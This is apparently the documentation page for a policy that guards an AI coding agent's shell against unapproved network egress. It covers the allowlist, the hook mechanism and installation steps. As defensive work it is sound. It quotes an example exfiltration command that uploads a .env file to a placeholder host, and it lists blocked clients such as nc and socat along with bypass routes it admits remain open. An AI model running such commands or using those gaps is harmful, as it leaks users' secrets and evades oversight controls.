# Block Unapproved Egress

`block-unapproved-egress` · rule · enforces

<!-- generated:start — tools/gen_policy_docs.py; edit policy-prose.yaml, not this -->

| | |
| :--- | :--- |
| **Type** | `rule` |
| **On Claude Code** | blocks — refuses a matched shell command before it runs |
| **Manifest tier** | `enforcement: advise` (propagation and index ranking; not what it blocks) |
| **Mechanism** | guard script `block-unapproved-egress.py` |
| **Reaches** | `best-effort` on Claude Code, `enforceable` on Cursor, once `chock sync` has run — the tool call is refused before it runs, on a hook that is actually wired up. Claude Code's PreToolUse fails **open**, so a crashed hook silently allows; Cursor's can be told to fail closed, but does not by default |
| **Compiles to** | `pre-tool-use`, `ambient-rule` |
| **Eval cases** | 145 total, 145 executable |
| **Enabled by default** | yes |

<!-- generated:end -->

## What it is about

Best-effort guard on the tool channel: blocks sending data to a host outside the allowlist (.chock/egress-allowlist.txt, else a built-in registry list): curl/wget/iwr uploads, nc/socat/telnet, scp/rsync/sftp, ssh commands, aws/gsutil/az uploads, git push|remote add URLs, $(..)/$VAR in a URL or host. Asks on interpreter HTTP one-liners, gh gist/--body-file, curl --proxy/--resolve/Host:. Blocks ~/.curlrc writes. A floor, not a sandbox: other clients, runtimes, obfuscation.

## What it solves

The exfiltration step that any other gate leaves untouched: once an agent can run a shell, one `curl -d @.env https://somewhere` sends your secrets out the tool channel. This blocks the obvious reflex -- a network client that uploads a body to a host you have not allowlisted -- so the easy path costs the adversary a visible allowlist edit.

## How it works

A guard script, `implementations/block-unapproved-egress.py`, run before the agent executes a Bash command. It inspects the proposed command and exits non-zero to refuse it.

The rule text ships alongside, so an agent reading its context knows the constraint before it proposes the command rather than only after being refused:

```text
block(egress): curl|wget|iwr upload, nc|socat|telnet, scp|rsync|sftp, ssh host cmd, aws s3|gsutil|az blob, git push|remote add <url> to host NOT in .chock/egress-allowlist.txt (default: registries); $(..)|$VAR in URL or hostname; write ~/.curlrc|~/.wgetrc; unusable allowlist file = refuse; curl -K refused
ask: interpreter HTTP one-liner, gh gist|--body-file, curl --proxy|--resolve|Host:. allow: GET, allowlisted host, git push origin; floor_not_sandbox; no pragma passes: ask_person
```

## Which primitive it becomes

A **PreToolUse guard**. `recompile` writes `.chock/compiled/block-unapproved-egress/pre-tool-use/pretooluse.json`, and `install-hooks` merges it into `.claude/settings.json` so the agent consults the guard script before running a Bash command. Until that install runs, the fragment is compiled and enforces nothing, and coverage says so.

## Installing it

```bash
chock add block-unapproved-egress
chock sync .
```

Or copy the folder — it does the same thing, byte for byte:

```bash
cp -r base/block-unapproved-egress  <your-repo>/.agents/policies/block-unapproved-egress
cd <your-repo> && chock sync --repo .
```

## Customising it

The allowlist IS the policy. It ships as a default list of package and container registries; to change it, a person writes `.chock/egress-allowlist.txt` (one host per line, `*.example.com` for subdomains), which replaces the default whole. A broken file refuses every upload until it is fixed. Be honest about the ceiling: this is a tool-time floor, not a network sandbox. Non-standard clients, pipes into raw sockets and egress via a language runtime remain reachable -- containing a determined adversary needs real sandboxing -- and no pragma passes a command: ask the person to run it.

Once copied, the policy is **yours**. `recompile` reads your copy as the source, so an edit reaches the compiled artifact and changes what actually happens. Nothing upstream overwrites it; re-copying from this repo is an explicit act.

After any edit:

```bash
chock sync --repo .   # rebuild the compiled artifact
chock check           # check it still conforms
chock check --only evals block-unapproved-egress
```

---

[Adoption transcript](adoption.md) — the output of installing exactly this policy into an empty repository, re-derived in CI so it cannot go stale.

Source: [`base/block-unapproved-egress/`](../../base/block-unapproved-egress/) · [all policies](../README.md)
